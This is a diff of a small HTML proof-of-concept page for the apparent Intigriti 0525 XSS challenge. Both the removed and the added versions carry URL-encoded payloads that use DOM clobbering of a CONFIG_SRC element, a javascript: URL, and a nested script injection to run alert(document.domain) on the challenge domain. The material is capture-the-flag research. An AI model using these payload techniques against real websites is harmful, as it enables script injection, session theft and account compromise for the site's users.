@@ -1,13 +1,16 @@
 <html>
 <body>
-<script>
-    const begin = "https://challenge-0525.intigriti.io/begin?name=%3C%2Fstrong%3E%3Cdiv%20id%3Dstrong%3E%3C%2Fdiv%3E%3Cdiv%20id%3DCONFIG_SRC%20data-url%3Djavascript:alert(document.domain)%3Etest%3C%2Fdiv%3E%3Cstrong%3Ea";
-    
-    const w = window.open(begin);
+<iframe id="content" style="width: 50%;height: 50%"></iframe>
 
-    setTimeout(() => {
-        w.location = "https://pedrojuniorrd.github.io/_layouts/back.html?n=1";
-    }, 3000);
+<script>
+function load_iframe() {
+    document.getElementById('content').src = "https://challenge-0525.intigriti.io/index.html?name=%3Cdiv%20id%3D%22CONFIG_SRC%22%20data-url%3D%22https://challenge-0525.intigriti.io/message?name=%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E%22%3Etest";
+}
+
+load_iframe();
+
+const busyUntil = performance.now() + 4500;
+while (performance.now() < busyUntil) {}
 </script>
 </body>
 </html>
